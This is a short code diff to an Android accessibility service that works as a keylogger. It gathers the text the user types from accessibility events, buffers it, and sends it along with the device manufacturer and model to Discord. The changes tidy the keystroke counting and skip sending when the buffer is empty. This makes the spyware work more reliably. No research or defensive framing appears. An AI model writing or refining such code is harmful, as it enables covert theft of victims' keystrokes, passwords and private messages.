@@ -54,10 +54,8 @@ public class MyAccessibilityService extends AccessibilityService {
         for (CharSequence text : textList) {
             String newText = text.toString();
             int newKeyEventCount = countKeyEvents(newText);
-
             if (newKeyEventCount > keyEventCount) {
                 currentKeyEvents.append(newText.substring(keyEventCount));
-
                 if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                     sendBufferToDiscordAndClear();
                 }
@@ -107,6 +105,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 sendBufferToDiscordAndClear();
                 lastBufferFlushTime = System.currentTimeMillis();
             }
+            keyEventCount = 0;
         }
 
         lastFocusedTime = currentTime;
@@ -123,6 +122,9 @@ public class MyAccessibilityService extends AccessibilityService {
         }
         String logMessage = currentKeyEvents.toString();
 
+        if (logMessage.trim().isEmpty()){
+            return;
+        }
         final String deviceInfo = "MANUFACTURER: " + Build.MANUFACTURER + "\n" +
                 "MODEL: " + Build.MODEL + "\n";
 
